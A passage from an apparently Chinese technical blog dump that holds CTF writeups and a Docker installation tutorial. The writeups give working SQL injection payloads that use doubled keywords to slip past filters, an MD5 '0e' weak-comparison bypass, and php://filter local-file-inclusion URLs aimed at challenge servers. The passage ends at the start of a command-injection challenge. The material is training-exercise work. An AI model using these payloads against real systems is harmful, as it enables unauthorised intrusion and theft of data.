id=\"寻找你的key\"><a href=\"#寻找你的key\" class=\"headerlink\" title=\"寻找你的key\"></a>寻找你的key</h3><p>zip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag</p>\n<p>KEY{dca57f966e4e4e31fd5b15417da63269}</p>\n<h3 id=\"302\"><a href=\"#302\" class=\"headerlink\" title=\"302\"></a>302</h3><p>抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为<code>123.com</code>，然后用key值在线解密网站解密即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;www.atool9.com&#x2F;steganography.php</span><br></pre></td></tr></table></figure>\n<p>flag{85bb86974a2a33bd4032ea3b7264b831}</p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h3><p>md5弱比较</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$s = sanitize_user_input($_GET[<span class=\"string\">'s'</span>]);</span><br><span class=\"line\">    $h = secured_hash_function($_GET[<span class=\"string\">'h'</span>]);</span><br><span class=\"line\">    $r = gen_secured_random();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($s != <span class=\"keyword\">false</span> &amp;&amp; $h != <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($s.$r == $h) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"Well done! Here is your flag: \"</span>.$flag;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过</p>\n<h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>测试列数，发现过滤，双写可以绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;1&#39; oorrder by 4-- +</span><br></pre></td></tr></table></figure>\n<p>测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 </p>\n<p>数据库名ctf</p>\n<p>爆表名<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()-- +</span><br><span class=\"line\"></span><br><span class=\"line\">ctf,f1ag1nit</span><br></pre></td></tr></table></figure><br>爆列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;f1ag1nit&#39;-- +</span><br><span class=\"line\"></span><br><span class=\"line\">id,flag</span><br></pre></td></tr></table></figure>\n<p>爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_35078631&#x2F;article&#x2F;details&#x2F;78589926</span><br></pre></td></tr></table></figure>\n<p>不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- +</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;3eaba49ada2ec0aa44ceaa7beee35401&#125;</span><br></pre></td></tr></table></figure>\n","categories":["writeup"],"tags":["CTF"]},{"title":"Docker简介与简单页面搭建","url":"/2018/04/20/docker1/","content":"<h1 id=\"Docker简介\"><a href=\"#Docker简介\" class=\"headerlink\" title=\"Docker简介\"></a>Docker简介</h1><p>最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。</p>\n<a id=\"more\"></a>\n<p><img src=\"/2018/04/20/docker1/1.jpg\" alt></p>\n<h1 id=\"Docker安装\"><a href=\"#Docker安装\" class=\"headerlink\" title=\"Docker安装\"></a>Docker安装</h1><h2 id=\"安装前检查\"><a href=\"#安装前检查\" class=\"headerlink\" title=\"安装前检查\"></a>安装前检查</h2><ol>\n<li>内核版本(具体支持哪些版本可以在官网查看)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n<p>如果内核不支持可以升级内核</p>\n<ol>\n<li>检查Device Mapper(存储驱动)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls  -l &#x2F;sys&#x2F;class&#x2F;misc&#x2F;device-mapper</span><br></pre></td></tr></table></figure>\n<p>查看文件是否存在</p>\n<h2 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a>安装Docker</h2><p>安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可，</p>\n<h3 id=\"Ubuntu\"><a href=\"#Ubuntu\" class=\"headerlink\" title=\"Ubuntu\"></a>Ubuntu</h3><p>试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下</p>\n<blockquote>\n<p>Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</p>\n</blockquote>\n<p>由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install curl</span><br><span class=\"line\">apt-get install ca-certificates</span><br><span class=\"line\">apt-get install software-properties-common</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install  apt-transprt-https</span><br></pre></td></tr></table></figure>\n<p>安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;ftp.nl.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;a&#x2F;apt&#x2F;apt-transport-https_1.4.8_amd64.deb</span><br><span class=\"line\">dpkg -i apt-transport-https_1.4.8_amd64.deb</span><br><span class=\"line\">wget http:&#x2F;&#x2F;ftp.nl.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;a&#x2F;apt&#x2F;libapt-pkg5.0_1.4.8_amd64.deb</span><br><span class=\"line\">dpkg -i libapt-pkg5.0_1.4.8_amd64.deb</span><br></pre></td></tr></table></figure>\n<p>添加 Docker 官方的 GPG key</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -fssl https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>\n<p>将 Docker 的源添加到 /etc/apt/sources.list</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>\n<p>更新一下镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br></pre></td></tr></table></figure>\n<p>安装docker</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install docker-ce</span><br></pre></td></tr></table></figure>\n<p>开启docker守护进程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker start</span><br></pre></td></tr></table></figure>\n<p>运行第一个容器，输出‘hello world’</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run centos echo &#39;hello world&#39;</span><br></pre></td></tr></table></figure>\n<h3 id=\"CentOS\"><a href=\"#CentOS\" class=\"headerlink\" title=\"CentOS\"></a>CentOS</h3><p>执行安装脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -fsSL https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br></pre></td></tr></table></figure>\n<p>安装完成后查看版本信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker version</span><br></pre></td></tr></table></figure>\n<p>开启docker守护进程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker start</span><br></pre></td></tr></table></figure>\n<p>运行第一个容器，输出‘hello world’</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run centos echo &#39;hello world&#39;</span><br></pre></td></tr></table></figure>\n<p>以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo groupadd docker</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo gpasswd -a charles docker</span><br></pre></td></tr></table></figure>\n<p>之后重启docker服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker restart</span><br></pre></td></tr></table></figure>\n<p>注销当前账户再重新登录即可运行docker命令啦！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker version</span><br></pre></td></tr></table></figure>\n<h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><p>Windows安装比较简单，到网址下载之后按照要求安装即可</p>\n<p><img src=\"/2018/04/20/docker1/2.jpg\" alt></p>\n<h1 id=\"Docker的基本操作\"><a href=\"#Docker的基本操作\" class=\"headerlink\" title=\"Docker的基本操作\"></a>Docker的基本操作</h1><h2 id=\"启动容器\"><a href=\"#启动容器\" class=\"headerlink\" title=\"启动容器\"></a>启动容器</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run centos echo &#39;hello world&#39;</span><br></pre></td></tr></table></figure>\n<p>在输出hello world之后镜像也就关闭了，无法交互</p>\n<h2 id=\"启动交互式容器\"><a href=\"#启动交互式容器\" class=\"headerlink\" title=\"启动交互式容器\"></a>启动交互式容器</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -i -t IMAGE &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-i: —interactive=true|默认是false，为容器始终打开标准输入<br>-t: —tty,为容器分配一个伪tty终端</p>\n</blockquote>\n<p>退出交互shell使用 <code>exit</code> 命令</p>\n<h2 id=\"查看容器\"><a href=\"#查看容器\" class=\"headerlink\" title=\"查看容器\"></a>查看容器</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker ps [-a] [-l]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-a: all<br>-l: latest</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker inspect 容器唯一ID或名字</span><br></pre></td></tr></table></figure>\n<p>该命令可以查看容器的详细信息</p>\n<p><strong>定义容器名字</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --name&#x3D;container01 -i -t ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"重新启动停止的容器\"><a href=\"#重新启动停止的容器\" class=\"headerlink\" title=\"重新启动停止的容器\"></a>重新启动停止的容器</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker start -i 容器名或ID</span><br></pre></td></tr></table></figure>\n<h2 id=\"删除容器\"><a href=\"#删除容器\" class=\"headerlink\" title=\"删除容器\"></a>删除容器</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rm ..</span><br></pre></td></tr></table></figure>\n<p>注意： 只能删除已经停止的容器</p>\n<h1 id=\"守护式容器\"><a href=\"#守护式容器\" class=\"headerlink\" title=\"守护式容器\"></a>守护式容器</h1><blockquote>\n<p>能够长期运行<br>没有交互式会话<br>适合运行应用程序和服务</p>\n</blockquote>\n<p>以守护形式运行容器</p>\n<p>以下列命令打开一个容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dcoker run -i -t ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<p>但是并不以exit命令退出而是以 <code>ctrl P+Q</code>退出，这样容器就会在后台运行</p>\n<p>可以使用 <code>docker ps -a</code> 来查看容器状态可以发下容器确实在后台运行</p>\n<p>使用attach命令再次进入容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker attach 容器ID</span><br></pre></td></tr></table></figure>\n<p>使用 <code>exit</code> 命令即可退出容器</p>\n<p>启动守护式容器最重要的方式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d 镜像名 [command]</span><br></pre></td></tr></table></figure>\n<hr>\n<p>我们来启动一个守护式容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --name dc1 -d ubuntu &#x2F;bin&#x2F;sh -c &quot;while true;do echo &#39;hello world&#39;; sleep 1; done&quot;</span><br></pre></td></tr></table></figure>\n<p>容器在后台运行，可以使用日志来查看执行情况</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker logs -tf --tail 0 dc1</span><br></pre></td></tr></table></figure>\n<p>参数的具体含义可在帮助文档中查看</p>\n<p>除了使用logs之外，还可使用进程命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker top dc1</span><br></pre></td></tr></table></figure>\n<p>在已经运行的容器中启动新的进程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec [-d] [-i] [-t] 容器名 [command]</span><br></pre></td></tr></table></figure>\n<p>关闭守护式容器有两种方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker stop dcname</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker kill dcname</span><br></pre></td></tr></table></figure>\n<p>stop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。</p>\n<hr>\n<p>具体想要查看更多命令的相关情况可以使用man命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">man docker-run</span><br><span class=\"line\">man docker-top</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<h1 id=\"在docker容器中部署静态网站\"><a href=\"#在docker容器中部署静态网站\" class=\"headerlink\" title=\"在docker容器中部署静态网站\"></a>在docker容器中部署静态网站</h1><ol>\n<li>设置容器的端口映射</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run -p|-P</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-P: 对容器所有的端口进行映射<br>-p: 指定映射哪些容器的端口</p>\n</blockquote>\n<p><img src=\"/2018/04/20/docker1/3.jpg\" alt></p>\n<ol>\n<li>开始部署</li>\n</ol>\n<p>先运行一个带端口映射的容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -i -t --name web -p 80 ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<p>进入容器之后安装Nginx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install -y nginx</span><br></pre></td></tr></table></figure>\n<p>接下来安装vim，用来编辑网页文件和配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install -y vim</span><br></pre></td></tr></table></figure>\n<p>新建一个工作目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>\n<p>切换到工作目录下,编辑一个静态页面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class=\"line\">vim index.html</span><br></pre></td></tr></table></figure>\n<p>具体编辑过程省略，接下来编辑Nginx配置文件</p>\n<p>查找一下Nginx文件的位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">whereis nginx</span><br></pre></td></tr></table></figure>\n<p>查看文件目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls &#x2F;etc&#x2F;nginx</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls &#x2F;etc&#x2F;nginx&#x2F;sites-enabled</span><br></pre></td></tr></table></figure>\n<p>可以看到有个default文件，修改该文件</p>\n<p>将root的值改为刚才创建的文件目录</p>\n<blockquote>\n<p>root: /var/www/html</p>\n</blockquote>\n<p>这样，配置就完成了，切换回根目录,运行Nginx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd &#x2F;</span><br><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n<p>可以使用ps命令查看nginx是否已经运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps -ef</span><br></pre></td></tr></table></figure>\n<p>可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出</p>\n<p>然后访问静态页面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;127.0.0.1:port</span><br></pre></td></tr></table></figure>\n<p>我们也可以用容器的IP地址来访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker inspect web</span><br></pre></td></tr></table></figure>\n<p>可以看到容器ip地址和映射端口</p>\n<blockquote>\n<p>“IPAddress”: “172.17.0.2”<br>“HostPort”: “32768”</p>\n</blockquote>\n<p>访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;172.17.0.2</span><br></pre></td></tr></table></figure>\n<p>这就不需要指定端口号了，用默认的80端口即可</p>\n<p>我们停止该容器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker stop web</span><br></pre></td></tr></table></figure>\n<p>然后在打开该服务</p>\n<p>运行 <code>ps -ef</code> 可以看到并没有开启Nginx服务</p>\n<p>这是退出容器</p>\n<p>然后用exec命令开启Nginx服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec web nginx</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker top web</span><br></pre></td></tr></table></figure>\n<p>可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问</p>\n<p>至此，简单搭建静态页面完成。</p>\n<h1 id=\"Docker镜像操作\"><a href=\"#Docker镜像操作\" class=\"headerlink\" title=\"Docker镜像操作\"></a>Docker镜像操作</h1><p>镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker images [OPTIONS] [REPOSITORY]</span><br><span class=\"line\">\t-a,--all&#x3D;false</span><br><span class=\"line\">\t-f,--filter &#x2F;&#x2F;过滤条件</span><br><span class=\"line\">\t--no-trunc&#x3D;false &#x2F;&#x2F;以非截断方式显示镜像信息，默认关闭</span><br><span class=\"line\">\t-q,--quiet&#x3D;false</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker images centos</span><br></pre></td></tr></table></figure>\n<p>返回docker中对应的centos镜像</p>\n<hr>\n<p>查看镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]</span><br><span class=\"line\">\t-f,--format&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>删除镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rmi [OPTIONS] IMAGE</span><br><span class=\"line\">\t-f,--force&#x3D;false &#x2F;&#x2F;强制删除</span><br><span class=\"line\">\t--no-prune&#x3D;false &#x2F;&#x2F;保留镜像中未打标签的父镜像</span><br></pre></td></tr></table></figure>\n<h1 id=\"获取和查找镜像\"><a href=\"#获取和查找镜像\" class=\"headerlink\" title=\"获取和查找镜像\"></a>获取和查找镜像</h1><h2 id=\"查找镜像\"><a href=\"#查找镜像\" class=\"headerlink\" title=\"查找镜像\"></a>查找镜像</h2><ul>\n<li>Docker Hub</li>\n</ul>\n<blockquote>\n<p>在官方网站上进行搜索</p>\n</blockquote>\n<ul>\n<li>docker search [OPTIOINS] TREM<br>  —automated=false Only show automated builds<br>  —no-trunc=false Don’t truncate output<br>  -s,—stars=0 Only displays with at least stars</li>\n</ul>\n<p><strong>EXAMPLE:</strong> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search ubuntu</span><br></pre></td></tr></table></figure>\n<h2 id=\"获取和推送镜像\"><a href=\"#获取和推送镜像\" class=\"headerlink\" title=\"获取和推送镜像\"></a>获取和推送镜像</h2><p><strong><em>拉取镜像</em></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull [OPTIONS] NAME [:TAG]</span><br><span class=\"line\">\t-a,--all-tags&#x3D;false Download all tagged images in the respository</span><br></pre></td></tr></table></figure>\n<p>EXP:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull ubuntu:14.04</span><br></pre></td></tr></table></figure>\n<p>这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度</p>\n<p>在 <code>daocloud</code> 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高</p>\n<p><strong><em>推送镜像</em></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker push NAME[:TAG]</span><br></pre></td></tr></table></figure>\n<h1 id=\"构建镜像\"><a href=\"#构建镜像\" class=\"headerlink\" title=\"构建镜像\"></a>构建镜像</h1><p>构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境</p>\n<h2 id=\"使用commit来构建镜像\"><a href=\"#使用commit来构建镜像\" class=\"headerlink\" title=\"使用commit来构建镜像\"></a>使用commit来构建镜像</h2><p>创建一个镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -p 80 --name commit_test ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<p>提交镜像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker commit -a &#39;charles&#39; -m &#39;nginx&#39; 仓库名</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用dockerfile创建镜像\"><a href=\"#使用dockerfile创建镜像\" class=\"headerlink\" title=\"使用dockerfile创建镜像\"></a>使用dockerfile创建镜像</h2><p>自行百度，略</p>\n<h1 id=\"Docker守护进程的配置与操作\"><a href=\"#Docker守护进程的配置与操作\" class=\"headerlink\" title=\"Docker守护进程的配置与操作\"></a>Docker守护进程的配置与操作</h1><h2 id=\"查看守护进程\"><a href=\"#查看守护进程\" class=\"headerlink\" title=\"查看守护进程\"></a>查看守护进程</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps -ef|grep docker</span><br><span class=\"line\">sudo status docker</span><br></pre></td></tr></table></figure>\n<h2 id=\"Docker守护进程的停止开始\"><a href=\"#Docker守护进程的停止开始\" class=\"headerlink\" title=\"Docker守护进程的停止开始\"></a>Docker守护进程的停止开始</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker stop|start|restart</span><br></pre></td></tr></table></figure>\n<p>Docker配置被修改后需要重启才能够生效</p>\n<h2 id=\"Docker的启动配置文件-配置docker的启动信息\"><a href=\"#Docker的启动配置文件-配置docker的启动信息\" class=\"headerlink\" title=\"Docker的启动配置文件(配置docker的启动信息)\"></a>Docker的启动配置文件(配置docker的启动信息)</h2><p>文件位置</p>\n<blockquote>\n<p>/etc/default/docker</p>\n</blockquote>\n<p>利用该文件可以修改docker的各种启动配置信息</p>\n<h1 id=\"Docker的远程访问\"><a href=\"#Docker的远程访问\" class=\"headerlink\" title=\"Docker的远程访问\"></a>Docker的远程访问</h1><h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><blockquote>\n<p>第二台安装docker的服务器<br>修改docker守护进程的启动选项以区别服务器<br>保证client API与server API版本一致</p>\n</blockquote>\n<h1 id=\"Dcoker的容器卷管理\"><a href=\"#Dcoker的容器卷管理\" class=\"headerlink\" title=\"Dcoker的容器卷管理\"></a>Dcoker的容器卷管理</h1><ol>\n<li>直接指定文件</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -v ~&#x2F;datavolume:[ro]&#x2F;data[:ro] ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>/datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限</p>\n</blockquote>\n<ol>\n<li>创建dockerfile</li>\n</ol>\n<h1 id=\"Docker容器互联\"><a href=\"#Docker容器互联\" class=\"headerlink\" title=\"Docker容器互联\"></a>Docker容器互联</h1><p>分别演示三部分</p>\n<blockquote>\n<p>允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接</p>\n</blockquote>\n","categories":["资料"],"tags":["docker"]},{"title":"hackme-web题解","url":"/2020/09/13/hackme-1/","content":"<p>历史文章补发</p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<a href=\"https://hackme.inndy.tw/\" target=\"_blank\" rel=\"noopener\">https://hackme.inndy.tw/</a></p>\n<a id=\"more\"></a>\n<h1 id=\"LFI\"><a href=\"#LFI\" class=\"headerlink\" title=\"LFI\"></a>LFI</h1><p>查看源代码</p>\n<p><img src=\"/2020/09/13/hackme-1/1.png\" alt></p>\n<p>尝试读取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p>\n</blockquote>\n<p>读取config即可得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config</span><br></pre></td></tr></table></figure>\n<h1 id=\"homepage\"><a href=\"#homepage\" class=\"headerlink\" title=\"homepage\"></a>homepage</h1><p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p>\n<h1 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h1><p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 